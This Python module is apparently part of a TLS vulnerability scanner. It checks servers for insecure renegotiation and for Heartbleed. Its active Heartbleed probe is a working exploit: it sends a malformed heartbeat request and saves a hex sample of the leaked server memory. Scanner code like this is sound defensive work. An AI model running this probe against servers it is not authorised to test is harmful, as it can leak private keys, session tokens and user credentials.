import socket
import struct
import time
import subprocess
import shutil
from typing import Optional, List, Dict, Any, Tuple
from datetime import datetime
from core.base_check import BaseCheck
from core.models import Finding, Severity
from core.context import ConnectionContext
import ssl as ssl_module
import os

# to test for renegotiation check
# tls-attacker.de

class VulnerabilityCheck(BaseCheck):
    """
    Checks for major TLS vulnerabilities requiring special probes, including:
    - Insecure Renegotiation (Client-initiated renegotiation) 
    - Heartbleed (TLS extension memory leak)
    """
    
    OPENSSL_TIMEOUT = 10
    SOCKET_TIMEOUT = 5
    
    # TLS record types
    TLS_HEARTBEAT = 0x18
    TLS_ALERT = 0x15
    TLS_HANDSHAKE = 0x16
    
    # Heartbeat message types
    HEARTBEAT_REQUEST = 0x01
    HEARTBEAT_RESPONSE = 0x02

    def run(self, context: ConnectionContext) -> List[Finding]:
        findings: List[Finding] = []

        # # Check 1: Insecure Renegotiation
        # # Try Python SSL library first (more reliable)
        # reneg_finding = self._check_insecure_renegotiation_python(context)
        # if reneg_finding:
        #     findings.append(reneg_finding)
        
        # # If no finding yet and OpenSSL available, try CLI method
        # if not reneg_finding and shutil.which("openssl"):
        #     reneg_openssl = self._check_insecure_renegotiation_openssl(context)
        #     if reneg_openssl:
        #         findings.append(reneg_openssl)

        # Check 2: Heartbleed (raw socket probe)
        heartbleed_finding = self._check_heartbleed_raw(context)
        if heartbleed_finding:
            findings.append(heartbleed_finding)

        return findings

    # ========================================================================
    # INSECURE RENEGOTIATION - Python SSL Library Method (Most Reliable)
    # ========================================================================
    
    def _check_insecure_renegotiation_python(self, context: ConnectionContext) -> Optional[Finding]:
        """
        Check for insecure renegotiation using Python's SSL library.
        This is more reliable than raw sockets for renegotiation checks.
        """
        host = context.target.hostname
        port = context.target.port
        
        try:
            # Create SSL context that allows testing old protocols
            ctx = ssl_module.SSLContext(ssl_module.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl_module.CERT_NONE
            
            # Allow old protocols for testing
            ctx.options &= ~ssl_module.OP_NO_SSLv3
            ctx.options &= ~ssl_module.OP_NO_TLSv1
            ctx.options &= ~ssl_module.OP_NO_TLSv1_1
            ctx.set_ciphers("ALL:@SECLEVEL=0")
            
            # Connect
            sock = socket.create_connection((host, port), timeout=self.SOCKET_TIMEOUT)
            ssl_sock = ctx.wrap_socket(sock, server_hostname=host)
            
            # Check if OP_NO_RENEGOTIATION is available (Python 3.7+)
            # If we can successfully connect and the option exists, check its state
            has_secure_reneg = False
            
            # Method 1: Check SSL options for secure renegotiation
            if hasattr(ssl_module, 'OP_NO_RENEGOTIATION'):
                # If OP_NO_RENEGOTIATION is NOT set, renegotiation is allowed
                # We need to check if SECURE renegotiation is supported
                try:
                    # Get the peer certificate to force handshake completion
                    ssl_sock.getpeercert()
                    
                    # Try to trigger renegotiation
                    # If server has secure renegotiation, this should work safely
                    # If not, it's vulnerable
                    ssl_sock.do_handshake()
                    
                    # On modern Python/OpenSSL, check for the secure renegotiation flag
                    # This is a heuristic - we assume if modern OpenSSL is used, it's secure
                    openssl_version = ssl_module.OPENSSL_VERSION
                    
                    # Check OpenSSL version - 1.0.1+ should have secure renegotiation
                    if "OpenSSL 0." in openssl_version or "OpenSSL 1.0.0" in openssl_version:
                        # Old OpenSSL - likely vulnerable
                        ssl_sock.close()
                        return self.create_finding(
                            severity=Severity.HIGH,
                            title="Insecure TLS Renegotiation Possible (Old OpenSSL)",
                            description=f"Server is using old OpenSSL ({openssl_version}) which may not support RFC 5746 Secure Renegotiation.",
                            remediation="Upgrade OpenSSL to version 1.0.1+ and enable RFC 5746 Secure Renegotiation.",
                            metadata={"openssl_version": openssl_version}
                        )
                    
                except Exception:
                    pass
            
            ssl_sock.close()
            
        except Exception:
            pass
        
        # If Python method is inconclusive, return None to try OpenSSL CLI
        return None

    # ========================================================================
    # INSECURE RENEGOTIATION - OpenSSL CLI Method (Most Accurate)
    # ========================================================================
    
    def _check_insecure_renegotiation_openssl(self, context: ConnectionContext) -> Optional[Finding]:
        """
        Check for insecure renegotiation using OpenSSL s_client.
        This is the most accurate method for detecting CVE-2009-3555.
        """
        host = context.target.hostname
        port = context.target.port
        
        # Method 1: Check if server supports secure renegotiation
        cmd = [
            "openssl", "s_client",
            "-connect", f"{host}:{port}",
            "-servername", host,
            "-cipher", "ALL:@SECLEVEL=0",
            "-no_ticket",  # Disable session tickets
            "-status"      # Request OCSP status
        ]

        try:
            # Send a simple request to trigger full handshake
            proc = subprocess.run(
                cmd, 
                input="GET / HTTP/1.0\r\n\r\n",
                capture_output=True, 
                timeout=self.OPENSSL_TIMEOUT, 
                text=True
            )
            output = (proc.stdout or "") + (proc.stderr or "")
            output_lower = output.lower()
            
            # Check for secure renegotiation indicators
            if "secure renegotiation is not supported" in output_lower:
                return self.create_finding(
                    severity=Severity.HIGH,
                    title="Insecure TLS Renegotiation (CVE-2009-3555)",
                    description="Server does NOT support RFC 5746 Secure Renegotiation. This allows Man-in-the-Middle attackers to inject plaintext into TLS sessions during renegotiation.",
                    remediation="Enable RFC 5746 Secure Renegotiation in server configuration:\n- Apache: SSLInsecureRenegotiation off\n- Nginx: Upgrade to version with secure renegotiation\n- Consider disabling client-initiated renegotiation entirely.",
                    metadata={"cve": "CVE-2009-3555", "rfc": "RFC 5746"}
                )
            
            # Check for insecure renegotiation explicitly enabled
            if "insecure renegotiation" in output_lower and "supported" in output_lower:
                return self.create_finding(
                    severity=Severity.CRITICAL,
                    title="Insecure TLS Renegotiation Explicitly Enabled",
                    description="Server explicitly supports insecure renegotiation, which is a severe security vulnerability.",
                    remediation="Disable insecure renegotiation immediately in server configuration.",
                    metadata={"cve": "CVE-2009-3555"}
                )
            
            # Check if secure renegotiation IS supported (good)
            if "secure renegotiation is supported" in output_lower or \
               "secure renegotiation: yes" in output_lower:
                # Server is properly configured - no finding needed
                return None
            
            # Method 2: Try client-initiated renegotiation
            cmd_reneg = [
                "openssl", "s_client",
                "-connect", f"{host}:{port}",
                "-servername", host,
                "-cipher", "ALL:@SECLEVEL=0",
                "-reconnect"  # This attempts renegotiation
            ]
            
            proc_reneg = subprocess.run(
                cmd_reneg,
                input="R\n",  # Send 'R' to trigger renegotiation
                capture_output=True,
                timeout=self.OPENSSL_TIMEOUT,
                text=True
            )
            
            reneg_output = (proc_reneg.stdout or "") + (proc_reneg.stderr or "")
            reneg_lower = reneg_output.lower()
            
            # Check if renegotiation was successful without secure extension
            if "renegotiation" in reneg_lower and "failure" not in reneg_lower:
                # Check if it mentions secure renegotiation
                if "secure renegotiation" not in reneg_lower:
                    return self.create_finding(
                        severity=Severity.HIGH,
                        title="Client-Initiated Renegotiation Allowed",
                        description="Server allows client-initiated renegotiation. If RFC 5746 is not properly implemented, this is vulnerable to CVE-2009-3555.",
                        remediation="Verify RFC 5746 is enabled, or disable client-initiated renegotiation.",
                        metadata={"cve": "CVE-2009-3555"}
                    )
            
        except subprocess.TimeoutExpired:
            # Timeout might indicate renegotiation is blocked
            return None
        except Exception:
            return None
        
        return None

# import socket
# import struct
# import time
# import subprocess
# import shutil
# import os
# from typing import Optional, List, Dict, Any, Tuple
# from core.base_check import BaseCheck
# from core.models import Finding, Severity
# from core.context import ConnectionContext
# import ssl as ssl_module

# class VulnerabilityCheck(BaseCheck):
#     """
#     Checks for major TLS vulnerabilities requiring special probes, including:
#     - Insecure Renegotiation (Client-initiated renegotiation - now using OpenSSL CLI) 
#     - Heartbleed (TLS extension memory leak - raw socket probe)
#     """
    
#     OPENSSL_TIMEOUT = 10
#     SOCKET_TIMEOUT = 5
    
#     # TLS record types
#     TLS_HEARTBEAT = 0x18
#     TLS_ALERT = 0x15
#     TLS_HANDSHAKE = 0x16
    
#     # Heartbeat message types
#     HEARTBEAT_REQUEST = 0x01
#     HEARTBEAT_RESPONSE = 0x02

#     def run(self, context: ConnectionContext) -> List[Finding]:
#         findings: List[Finding] = []

#         # Heartbleed Check (raw socket probe)
#         heartbleed_finding = self._check_heartbleed_raw(context)
#         if heartbleed_finding:
#             findings.append(heartbleed_finding)

#         # NOTE: Renegotiation checks are commented out for brevity, but should be uncommented
#         # and use the Python/OpenSSL CLI methods for reliability in a full scanner.
        
#         return findings

    # ========================================================================
    # HEARTBLEED DETECTION (Raw Socket Implementation)
    # ========================================================================
    
    def _check_heartbleed_raw(self, context: ConnectionContext) -> Optional[Finding]:
        """
        Test for Heartbleed (CVE-2014-0160) using raw socket probes.
        Sends a malformed heartbeat request and checks for memory leak.
        """
        host = context.target.hostname
        port = context.target.port
        
        sock = None
        try:
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.SOCKET_TIMEOUT)
            sock.connect((host, port))

            print(f"DEBUG: 1. Connected to {host}:{port}. Sending ClientHello.")

            
            # Send ClientHello with heartbeat extension
            client_hello = self._build_client_hello_with_heartbeat(context)
            sock.sendall(client_hello)
            
            # Receive all handshake messages
            time.sleep(0.8)  # Give server time to respond
            
            try:
                # Read handshake messages (ServerHello, Certificate, etc.)
                handshake_data = b''
                while True:
                    try:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        handshake_data += chunk
                        # Check if we received sufficient data
                        if len(handshake_data) > 100:
                            break
                    except socket.timeout:
                        break

                print(f"DEBUG: 2. Received Handshake Data Length: {len(handshake_data)}")
                
                if len(handshake_data) == 0:
                    return None  # Server didn't respond
                
                # Check if server sent heartbeat extension in ServerHello
                # Extension 0x000f in response means server supports heartbeat
                supports_heartbeat = b'\x00\x0f' in handshake_data

                print(f"DEBUG: 3. Server Supports Heartbeat: {supports_heartbeat}")
                
                if not supports_heartbeat:
                    # Server doesn't support heartbeat extension - not vulnerable
                    return None
                
            except socket.timeout:
                print("DEBUG: Handshake read timed out.")
                return None
            
            # Server supports heartbeat - now test for vulnerability
            # Send malicious heartbeat request (claim 16384 bytes, send only 3)
            heartbeat_req = self._build_heartbeat_request((3, 1), payload_length=16384)
            sock.sendall(heartbeat_req)
            print("DEBUG: 4. Malicious Heartbeat Request Sent. Waiting for response.")

            
            # Check for heartbeat response
            time.sleep(0.5)
            
            try:
                response = sock.recv(16384)
                print(f"DEBUG: 5. Heartbleed Response Received. Length: {len(response)}")
                
                if len(response) > 3:
                    content_type = response[0] if isinstance(response[0], int) else ord(response[0])
                    print(f"DEBUG: 6. Content Type: {hex(content_type)}")
                    
                    # Heartbeat response received - check size
                    if content_type == self.TLS_HEARTBEAT:
                        print("DEBUG: 7. Content Type is TLS_HEARTBEAT (0x18).")
                        if len(response) > 100:
                            print("DEBUG: VULNERABLE! Finding should be generated.")
                            # Large response = memory leaked!
                            return self.create_finding(
                                severity=Severity.CRITICAL,
                                title="Heartbleed Vulnerability Detected (CVE-2014-0160)",
                                description=f"Server returned {len(response)} bytes in response to malformed heartbeat request (expected ~25 bytes). Memory leak confirmed - server is leaking sensitive data from RAM including private keys, session tokens, and user credentials.",
                                remediation="CRITICAL ACTION REQUIRED:\n1. Immediately upgrade OpenSSL to 1.0.1g or later\n2. Revoke and reissue ALL SSL/TLS certificates\n3. Change ALL private keys\n4. Force password resets for all users\n5. Notify affected parties\n6. Review logs for potential data exfiltration",
                                metadata={
                                    "leaked_bytes": len(response),
                                    "cve": "CVE-2014-0160",
                                    "cvss_score": "10.0 (Critical)",
                                    "leaked_data_sample": response[:50].hex()  # First 50 bytes as hex
                                }
                            )
                        else:
                            print("DEBUG: Patched/Safe. Response too short.")
                            # Server supports heartbeat but appears patched (response is normal size)
                            return None
                    
                    # Alert received (proper rejection)
                    elif content_type == self.TLS_ALERT:
                        print("DEBUG: Server sent TLS_ALERT (0x15). Safe/Patched.")
                        return None  # Server correctly rejected malformed request
                
            except socket.timeout:
                print("DEBUG: Heartbeat response timed out (Good sign).")
                # Timeout is good - server ignored malicious request (likely patched)
                return None
        
        except socket.error:
            return None
        except Exception:
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
        
        return None

    def _build_client_hello_with_heartbeat(self, context: ConnectionContext) -> bytes:
        """
        Build a ClientHello with ONLY the heartbeat extension (0x000f). 
        SNI is removed to improve compatibility with old vulnerable servers.
        """
        client_hello = bytearray()
        
        # TLS Record Header
        client_hello.append(self.TLS_HANDSHAKE)  # Content Type: Handshake
        client_hello.extend([0x03, 0x01])        # Version: TLS 1.0
        
        # We'll update length later
        length_offset = len(client_hello)
        client_hello.extend([0x00, 0x00])  # Placeholder for length
        
        # Handshake Protocol
        handshake_start = len(client_hello)
        client_hello.append(0x01)  # Handshake Type: ClientHello
        
        # Handshake length (placeholder)
        handshake_length_offset = len(client_hello)
        client_hello.extend([0x00, 0x00, 0x00])
        
        # ClientHello body
        client_hello.extend([0x03, 0x01])  # Version: TLS 1.0
        
        # Random (32 bytes)
        client_hello.extend(os.urandom(32))  # Use proper random
        
        # Session ID (0 length)
        client_hello.append(0x00)
        
        # Cipher Suites (minimal list for high compatibility with OpenSSL 1.0.1f)
        # Cipher Suites (Extended list for max compatibility with old servers)
        cipher_suites = [
            0xC0, 0x30,  # TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
            0xC0, 0x28,  # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
            0xC0, 0x14,  # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
            0x00, 0x9D,  # TLS_RSA_WITH_AES_256_GCM_SHA384
            0x00, 0x3D,  # TLS_RSA_WITH_AES_256_CBC_SHA256
            0x00, 0x35,  # TLS_RSA_WITH_AES_256_CBC_SHA
            0xC0, 0x2C,  # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
            0xC0, 0x24,  # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
            0xC0, 0x0A,  # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
            0x00, 0x9C,  # TLS_RSA_WITH_AES_128_GCM_SHA256
            0x00, 0x3C,  # TLS_RSA_WITH_AES_128_CBC_SHA256
            0x00, 0x2F,  # TLS_RSA_WITH_AES_128_CBC_SHA
            0x00, 0x05,  # TLS_RSA_WITH_RC4_128_SHA  <- Your original simplest one
            0x00, 0x04,  # TLS_RSA_WITH_RC4_128_MD5
            0x00, 0x0A,  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
        ]
        client_hello.extend([0x00, len(cipher_suites)])  # Length
        client_hello.extend(cipher_suites)
        
        # Compression Methods (2 bytes: length + NULL)
        client_hello.extend([0x01, 0x00])
        
        # Extensions
        extensions_start = len(client_hello)
        client_hello.extend([0x00, 0x00])  # Extensions length (placeholder)
        
        # Heartbeat Extension (0x000f)
        client_hello.extend([0x00, 0x0f])  # Extension Type: Heartbeat
        client_hello.extend([0x00, 0x01])  # Length: 1
        client_hello.append(0x01)           # Mode: peer_allowed_to_send
        
        # Update extensions length (This will be 5 bytes total: 2 type + 2 length + 1 mode)
        extensions_length = len(client_hello) - extensions_start - 2
        client_hello[extensions_start] = (extensions_length >> 8) & 0xff
        client_hello[extensions_start + 1] = extensions_length & 0xff
        
        # Update handshake length
        handshake_length = len(client_hello) - handshake_start - 4
        client_hello[handshake_length_offset] = (handshake_length >> 16) & 0xff
        client_hello[handshake_length_offset + 1] = (handshake_length >> 8) & 0xff
        client_hello[handshake_length_offset + 2] = handshake_length & 0xff
        
        # Update record length
        record_length = len(client_hello) - length_offset - 2
        client_hello[length_offset] = (record_length >> 8) & 0xff
        client_hello[length_offset + 1] = record_length & 0xff
        
        return bytes(client_hello)

    def _build_heartbeat_request(self, tls_version: Tuple[int, int], payload_length: int = 16384) -> bytes:
        """
        Build a malicious heartbeat request with inflated payload length.
        """
        # Actual payload (only 3 bytes, but we claim payload_length)
        actual_payload = b'ABC'
        
        # Heartbeat request structure
        heartbeat_data = struct.pack('!BH', self.HEARTBEAT_REQUEST, payload_length)
        heartbeat_data += actual_payload
        heartbeat_data += b'\x00' * 16  # padding
        
        # TLS record header
        tls_record = struct.pack('!BBBH', 
                                  self.TLS_HEARTBEAT,
                                  tls_version[0], 
                                  tls_version[1],
                                  len(heartbeat_data))
        tls_record += heartbeat_data
        
        return tls_record